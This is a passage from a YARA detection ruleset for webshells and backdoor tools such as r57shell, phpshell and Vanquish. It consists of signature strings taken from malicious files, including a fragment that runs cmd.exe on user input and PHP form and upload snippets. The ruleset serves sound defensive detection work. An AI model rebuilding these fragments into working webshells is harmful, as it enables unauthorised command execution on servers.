		hash = "b4a09911a5b23e00b55abe546ded691c"
		logic_hash = "19719e8c9215ec9ba9fab55b604907e0a6d0a0507a5662926acff1e9dc03440e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\""
		$s3 = "         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\""
		$s4 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<"

	condition:
		all of them
}

rule SIGNATURE_BASE_Saphpshell
{
	meta:
		description = "Webshells Auto-generated - file saphpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "42bcd739-714e-5dbf-a3a1-929f3d16ed6f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7528-L7539"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d7bba8def713512ddda14baf9cd6889a"
		logic_hash = "24d558292a709bb29334b1acdc53cdb6c5bc6803caec527edcacd6a19f6dc7c9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006Z
{
	meta:
		description = "Webshells Auto-generated - file 2006Z.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7540-L7552"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "fd1b6129abd4ab177fed135e3b665488"
		logic_hash = "4b427132541cd26ee47c387a98f6f46f86808f9a775068e1d114c9ef4abca9f6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth"
		$s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x"

	condition:
		all of them
}

rule SIGNATURE_BASE_Admin_Ad
{
	meta:
		description = "Webshells Auto-generated - file admin-ad.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7d87b4f6-3227-53cb-803c-4f9c7327f203"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7553-L7565"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e6819b8f8ff2f1073f7d46a0b192f43b"
		logic_hash = "0febd10979a959af73332a8e064a510e949109abf863b5fd0fef19b635968d1d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz"
		$s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Casus15
{
	meta:
		description = "Webshells Auto-generated - file casus15.php"
		author = "Florian Roth (Nextron Systems)"
		id = "305842e4-26ad-573d-8df3-e32e239e434b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7566-L7577"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8d155b4239d922367af5d0a1b89533a3"
		logic_hash = "58921290952f23ff5b828d8c92c818ebd91b726cdbbc9137b0f55a0e5ca90636"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))"

	condition:
		all of them
}

rule SIGNATURE_BASE_BIN_Client
{
	meta:
		description = "Webshells Auto-generated - file Client.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "515ab1b3-7923-55de-8c19-71ef5d9b4366"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7578-L7594"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9f0a74ec81bc2f26f16c5c172b80eca7"
		logic_hash = "e1277f6b7adc2e832a3aad96c7e44796596d2e61eb9247977da3c3569777e0b2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "=====Remote Shell Closed====="
		$s2 = "All Files(*.*)|*.*||"
		$s6 = "WSAStartup Error!"
		$s7 = "SHGetFileInfoA"
		$s8 = "CreateThread False!"
		$s9 = "Port Number Error"

	condition:
		4 of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Uptime
{
	meta:
		description = "Webshells Auto-generated - file uptime.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "4f649757-9502-5640-bc17-11cad6c779f4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7595-L7610"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d1f56102bc5d3e2e37ab3ffa392073b9"
		logic_hash = "5d91dda859a63a965250bd4d76565c6adf18e4ee306be3b91965e5d35bc521e8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "JDiamondCSlC~"
		$s1 = "CharactQA"
		$s2 = "$Info: This file is packed with the UPX executable packer $"
		$s5 = "HandlereateConso"
		$s7 = "ION\\System\\FloatingPo"

	condition:
		all of them
}

rule SIGNATURE_BASE_Simple_PHP_Backdoor
{
	meta:
		description = "Webshells Auto-generated - file Simple_PHP_BackDooR.php"
		author = "Florian Roth (Nextron Systems)"
		id = "bd7c19b9-e035-5e70-b626-1d210cadc055"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7611-L7624"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a401132363eecc3a1040774bec9cb24f"
		logic_hash = "9739217c23f583452fbf1d7a8e20b2f1379ebf430e0a4fd73ad62e88d544670a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he"
		$s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn"
		$s9 = "// a simple php backdoor"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Sig_2005Gray
{
	meta:
		description = "Webshells Auto-generated - file 2005Gray.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "978fb04e-517d-51cf-98ca-5fd6b421365e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7625-L7639"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "75dbe3d3b70a5678225d3e2d78b604cc"
		logic_hash = "927ed5cdaa14b6cd63a6ca7d7bec6635b69fa19d88808890e7d198fb7a0b57b4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SCROLLBAR-FACE-COLOR: #e8e7e7;"
		$s4 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s8 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
		$s9 = "SCROLLBAR-3DLIGHT-COLOR: #cccccc;"

	condition:
		all of them
}

rule SIGNATURE_BASE_Dllinjection
{
	meta:
		description = "Webshells Auto-generated - file DllInjection.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8a57e122-fd00-57f3-94db-736c5bfd76db"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7640-L7651"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a7b92283a5102886ab8aee2bc5c8d718"
		logic_hash = "6e01ae1cc8a91a5e0d22bdf477aa72bf0116dbe31752a069b1e34d8a09ec6213"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\BDoor\\DllInjecti"

	condition:
		all of them
}

rule SIGNATURE_BASE_Mithril_V1_45_Mithril
{
	meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3c160017-0332-532a-bb7f-390a4a34dc4e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7652-L7664"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f1484f882dc381dde6eaa0b80ef64a07"
		logic_hash = "a3e74bfb34762553eccaddd745d9e17dc3a5a25201e4bc9e2ea9a49342295c78"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "cress.exe"
		$s7 = "\\Debug\\Mithril."

	condition:
		all of them
}

rule SIGNATURE_BASE_Hkshell_Hkrmv
{
	meta:
		description = "Webshells Auto-generated - file hkrmv.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "986fad12-9198-5e0a-88d6-a9be6963ff8c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7665-L7677"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "bd3a0b7a6b5536f8d96f50956560e9bf"
		logic_hash = "f1da0778456272e6d93633a564018bdf0fa74f1db1c9e963a03a59c69c752b6e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "/THUMBPOSITION7"
		$s6 = "\\EvilBlade\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_WEBSHELL_PHP_1
{
	meta:
		description = "Webshells Auto-generated - file phpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d0107af3-e484-54cf-a238-dd1e71efd3f6"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "phpshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7678-L7692"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1dccb1ea9f24ffbd085571c88585517b"
		logic_hash = "eed450ae6668bbee01ea2689e9864f10a66714ec4c91afabb12609ad4ebdac8c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b"
		$s2 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR"
		$s3 = "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", "

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Cmd
{
	meta:
		description = "Webshells Auto-generated - file cmd.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "f7a74f21-aec9-5ee7-a80e-0fe34b977a71"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7693-L7705"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cbe8e365d41dd3cd8e462ca434cf385f"
		logic_hash = "43f3379a57210f0e3b70575313115a7ba3d71359de7c5ac9a6a178b93af3545e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
		$s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Phpft
{
	meta:
		description = "Webshells Auto-generated - file phpft.php"
		author = "Florian Roth (Nextron Systems)"
		id = "00bc690b-4977-5076-a40a-edd39c37233f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7706-L7718"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "60ef80175fcc6a879ca57c54226646b1"
		logic_hash = "741536acafdc4da618d69bdae2f0a3e8c004a4027cc76c796158ee111c006414"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "PHP Files Thief"
		$s11 = "http://www.4ngel.net"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Indexer
{
	meta:
		description = "Webshells Auto-generated - file indexer.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "fba053d7-5413-563f-8c27-0554349500b2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7719-L7730"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "135fc50f85228691b401848caef3be9e"
		logic_hash = "a1bfba9c24819f5c1574aa179d853a6cc2fcf58c7b9a14eeab2639248178549c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r"

	condition:
		all of them
}

rule SIGNATURE_BASE_R57Shell
{
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1f1070e8-e82c-5cae-a64a-cd5028adae97"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7731-L7742"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8023394542cddf8aee5dec6072ed02b5"
		logic_hash = "40ff6bceb3f9bd95fbf5e75681fadadaa64243007e10fcc86bb909282b8161c5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to"

	condition:
		all of them
}

rule SIGNATURE_BASE_Bdcli100
{
	meta:
		description = "Webshells Auto-generated - file bdcli100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c74e8822-9556-5596-a130-c6e0120d7103"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7743-L7755"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b12163ac53789fb4f62e4f17a8c2e028"
		logic_hash = "48c70413c71d5a84f8cea48c77935b7cc26d9e1348d7ab257de4540d69f0f817"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "unable to connect to "
		$s8 = "backdoor is corrupted on "

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_2005Red
{
	meta:
		description = "Webshells Auto-generated - file 2005Red.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "963effd9-f31d-5238-9419-b5dd11822e56"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7756-L7769"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d8ccda2214b3f6eabd4502a050eb8fe8"
		logic_hash = "716b6faa8d1216f592d63b658cdd65d7be0226bf746b5fdf1827bdf881562711"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "scrollbar-darkshadow-color:#FF9DBB;"
		$s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006X2
{
	meta:
		description = "Webshells Auto-generated - file 2006X2.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7770-L7782"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cc5bf9fc56d404ebbc492855393d7620"
		logic_hash = "0df587ccaf41d11c6be90ef631ce8b21f95f08fa8f71e62463c378455b312f4a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Powered By "
		$s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this."

	condition:
		all of them
}

rule SIGNATURE_BASE_Rdrbs084
{
	meta:
		description = "Webshells Auto-generated - file rdrbs084.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "97548273-6894-5c9f-8cca-d966ce770ada"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7783-L7795"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ed30327b255816bdd7590bf891aa0020"
		logic_hash = "8a743d62723c4a5f863f986edd4b149728680b40d6a4b9a99b093d62ccb70cf8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Create mapped port. You have to specify domain when using HTTP type."
		$s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Caseswitch_2005
{
	meta:
		description = "Webshells Auto-generated - file 2005.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0f2b8e71-1c11-5efe-bee7-146168aec369"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7796-L7814"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8bf667ee9e21366bc0bd3491cb614f41"
		logic_hash = "0ecf28b5abb918cd1d8f38b76019dddf19dff5dbb114f16ef6ec9b46cb590a46"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "MSComDlg.CommonDialog"
		$s2 = "CommonDialog1"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s5 = "EVENT_SINK_AddRef"
		$s6 = "By Marcos"
		$s7 = "EVENT_SINK_QueryInterface"
		$s8 = "MethCallEngine"

	condition:
		all of them
}

rule SIGNATURE_BASE_Ebayid_Index3
{
	meta:
		description = "Webshells Auto-generated - file index3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4fc30150-7b44-53c4-888c-faf651495407"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7815-L7826"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0412b1e37f41ea0d002e4ed11608905f"
		logic_hash = "47660cb71d6787683e51aa14fc0f4a9d6f1c59517b77bfe4135098a0020ded11"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phvayv
{
	meta:
		description = "Webshells Auto-generated - file phvayv.php"
		author = "Florian Roth (Nextron Systems)"
		id = "07e027a6-01a5-5250-a35e-fbfef1449cfe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7827-L7838"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "205ecda66c443083403efb1e5c7f7878"
		logic_hash = "d0482607f7d9cf6c89963cb9b1f943fa0b80636e857e0fb044cd9a0b3f974deb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "wrap=\"OFF\">XXXX</textarea></font><font face"

	condition:
		all of them
}

rule SIGNATURE_BASE_Byshell063_Ntboot
{
	meta:
		description = "Webshells Auto-generated - file ntboot.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7d1f39f6-04f1-51ee-b125-c35af8ae4c0c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7839-L7853"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "99b5f49db6d6d9a9faeffb29fd8e6d8c"
		logic_hash = "2fdc930eacb87d02ebe69a2b64df4103bd0f3417a76f1b2922b3d4cd4c0dffe9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtBoot"
		$s1 = "Failure ... Access is Denied !"
		$s2 = "Dumping Description to Registry..."
		$s3 = "Opening Service .... Failure !"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Casus15_2
{
	meta:
		description = "Webshells Auto-generated - file casus15.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d3f67fe9-a93f-504a-8b14-a815135d562f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7854-L7865"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8d155b4239d922367af5d0a1b89533a3"
		logic_hash = "45820e0398cca8e75fc4acf6863d962a817afd95a4592acd4ac4a50029684220"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "copy ( $dosya_gonder"

	condition:
		all of them
}

rule SIGNATURE_BASE_Installer
{
	meta:
		description = "Webshells Auto-generated - file installer.cmd"
		author = "Florian Roth (Nextron Systems)"
		id = "681d8284-55e5-5316-a0d2-f4f13218df76"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7866-L7878"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a507919ae701cf7e42fa441d3ad95f8f"
		logic_hash = "73c1032313155ceb752fe2f94c8d242833127fe0443d7e3044fa1de2b2b7742b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Restore Old Vanquish"
		$s4 = "ReInstall Vanquish"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remview_2
{
	meta:
		description = "Webshells Auto-generated - file remview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "8e0492e8-d683-5c2d-b1ce-6c8344b874af"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L7879-L7891"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b4a09911a5b23e00b55abe546ded691c"
		logic_hash = "0a682431f7044e9a49c8dd4842a22c521e2a07d5df045b0a12449e3b3206716b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<xmp>$out</"
		$s1 = ".mm(\"Eval PHP code\")."

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_R57
{
	meta:
